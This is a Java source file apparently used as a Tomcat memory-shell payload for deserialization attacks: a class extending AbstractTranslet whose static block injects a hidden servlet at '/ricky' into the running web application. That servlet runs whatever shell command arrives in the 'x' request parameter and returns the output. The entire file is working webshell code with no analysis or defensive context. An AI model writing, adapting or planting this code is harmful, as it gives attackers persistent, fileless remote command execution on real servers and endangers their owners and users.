import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class EvilServlet extends AbstractTranslet implements Servlet {
    static {
        try{
            final String urlPattern = "/ricky";
            final String servletName = "ricky";
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();

            Servlet servlet = new EvilServlet();

            Wrapper wrapper = standardContext.createWrapper();
            wrapper.setLoadOnStartup(1);
            wrapper.setName(servletName);
            wrapper.setServlet(servlet);
            wrapper.setServletClass(servlet.getClass().getName());

            standardContext.addChild(wrapper);
            standardContext.addServletMapping(urlPattern, servletName);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        if(servletRequest.getParameter("x") != null){
            Process process = Runtime.getRuntime().exec(servletRequest.getParameter("x"));
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String str = "";
            String line;
            while((line = reader.readLine()) != null) {
                str += line;
            }
            servletResponse.getOutputStream().write(str.getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
